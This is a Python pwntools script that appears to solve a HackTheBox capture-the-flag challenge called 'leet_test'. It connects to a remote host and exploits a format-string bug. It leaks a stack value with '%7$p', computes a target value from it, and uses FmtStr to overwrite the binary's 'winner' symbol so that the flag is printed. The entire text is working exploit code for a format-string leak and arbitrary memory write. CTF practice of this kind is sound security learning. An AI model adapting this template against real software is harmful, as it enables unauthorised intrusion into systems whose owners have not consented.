from pwn import *

address = '94.237.59.180'
port = 45570

context.log_level = 'critical'
context.binary = binary = ELF('./leet_test')

def exploitFmtStr(payload):
	target.sendlineafter(b'Please enter your name:',payload)
	return target.recvline().strip()

target = remote(address,port)

target.sendlineafter(b'Please enter your name:', b'%7$p')
target.recvuntil(b'Hello, ')

random = int(target.recvline().strip().decode()[:6],16)
print(f'Random: {hex(random)}')

targetValue = (random * 0x1337c0de)
print(f'Target value: {hex(targetValue)}')

fmtStr = FmtStr(exploitFmtStr)
fmtStr.write(binary.symbols.winner, targetValue)
fmtStr.execute_writes()

flagData = target.recvuntil(b'}')
flag = flagData[flagData.index(b'HTB'):].decode()

print(flag)
